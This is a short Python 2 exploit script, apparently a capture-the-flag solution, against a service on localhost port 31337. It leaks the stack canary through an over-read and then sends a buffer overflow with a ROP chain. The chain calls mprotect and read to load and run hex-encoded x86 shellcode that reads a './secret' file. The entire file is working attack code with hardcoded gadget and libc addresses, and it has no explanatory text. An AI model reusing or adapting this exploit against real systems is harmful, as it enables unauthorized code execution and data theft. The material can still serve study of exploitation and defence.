#!python
from struct import pack, unpack
from socket import *
import os
import sys

# ropshell: http://ropshell.com/search?h=2eb6c7daf5a70474bcb0bd267161c02c

# cat ./secret
sc = '6a01fe0c246863726574682e2f736589e331c96a0558cd809589eb6a035899b23089e1cd8085c07e0e6a055b89c26a045889e1cd80ebe2'.decode('hex')
ELFBASE  = 0x080486b0
READ     = 0xb7eea890
MPROTECT = 0xb7ef72b0
BSS      = 0x0804a000 #0x0804a068
PPPR     = ELFBASE + 0x0000058d # pop esi ; pop edi ; pop ebp ; ret ;;

def p32(p):
    return pack('<I', p)

def u32(p):
    return unpack('<I', p)[0]

def Get_ROP():
    p  = ''
    # mprotect( bss, len(sc), 0x7 )
    p += p32(MPROTECT)
    p += p32(PPPR)
    p += p32(BSS)
    p += p32(len(sc))
    p += p32(0x7) # RWE

    # read( 0x5, bss, len(sc) )
    p += p32(READ)
    p += p32(PPPR)
    p += p32(0x5)
    p += p32(BSS)
    p += p32(len(sc))
    # execute
    p += p32(BSS)

    return p

while 1:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 31337))
    print s.recv(19)
    s.send('A'*16 + '\n')
    rv = s.recv(1540)
    canary = u32('\x00' + rv[17:20])
    if canary:
        print "Canary: %s" % (hex(canary))
        break
    else:
        print "Couldn't get a canary. Try again.."
    s.close()


s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 31337))
print s.recv(19)
p  = 'A' * 16
p += p32(canary)
p += 'BBBBCCCCDDDD' # dummy
p += Get_ROP()
 
s.send(p + '\n')
rv = s.recv(1540)
s.send(sc + '\n')
print s.recv(1540)
